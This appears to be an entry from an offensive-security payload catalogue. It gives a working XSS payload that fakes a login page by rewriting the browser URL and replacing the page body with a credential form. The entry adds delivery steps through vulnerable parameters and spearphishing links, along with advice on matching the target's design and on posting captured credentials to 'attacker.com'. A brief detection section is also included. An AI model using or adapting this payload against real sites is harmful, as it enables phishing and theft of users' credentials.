---
id: 4b8410a1-c087-4bc6-8e7c-d6a4c91b03b4
type: code
language: HTML
verified: true
created_at: '2023-04-06T03:56:41.700485+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - xss
  - ui-redressing
  - phishing
  - credential-theft
platforms:
  - Web
validated: true
---

# UI-Redressing-Fake-Login-Form-Script

## Code

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

## Description

This HTML/JavaScript snippet is a payload for UI redressing attacks, specifically designed to simulate a fake login form. It uses the History API to change the browser's URL to appear as a legitimate login page and replaces the entire body content with a simple form prompting for username and password. When injected via XSS, it deceives users into entering credentials, which can then be captured by modifying the form to POST to an attacker-controlled endpoint.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| '../../../login' | Relative path to mimic a login URL; adjust based on target site structure | '/auth/login' |
| Form fields | Basic input elements; customize styling or add action attribute for exfiltration | action='http://attacker.com/capture' method='POST' |

## Usage

Inject this code into a vulnerable XSS input field, such as a URL parameter (e.g., `?search=<payload>`). It is typically delivered via spearphishing links to victims browsing the compromised site. Before deployment, enhance the form with CSS to match the target's design and set up a server to handle credential submissions. Used in procedures like [[procedures/UI-Redressing-with-Fake-Login-Form-Injection]] for phishing-based credential access.

## Detection

- Browser developer tools showing unexpected DOM manipulations or history changes.
- Content Security Policy (CSP) violations if enabled.
- Anomalous form submissions to external domains via network monitoring.
- User reports of unsolicited login prompts on trusted sites.

## Related

- [[procedures/UI-Redressing-with-Fake-Login-Form-Injection]]
